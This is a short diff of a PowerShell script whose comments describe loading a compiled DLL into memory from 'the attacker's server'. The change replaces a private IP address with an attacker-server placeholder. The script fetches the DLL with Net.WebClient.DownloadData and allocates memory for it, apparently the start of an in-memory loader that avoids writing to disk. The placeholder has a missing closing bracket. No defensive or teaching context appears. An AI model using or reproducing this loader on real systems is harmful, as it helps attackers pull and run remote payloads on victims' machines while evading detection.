@@ -1,6 +1,6 @@
 # Load the compiled DLL into memory (hosted on the attacker's server)
 $webClient = New-Object Net.WebClient
-$dllBytes = $webClient.DownloadData("http://192.168.1.15:8080/mydll.dll")  # Use your compiled DLL
+$dllBytes = $webClient.DownloadData("http://<attacker_server_IP:8080/mydll.dll")  # Use your compiled DLL
 
 # Allocate memory for the DLL
 $virtualAlloc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
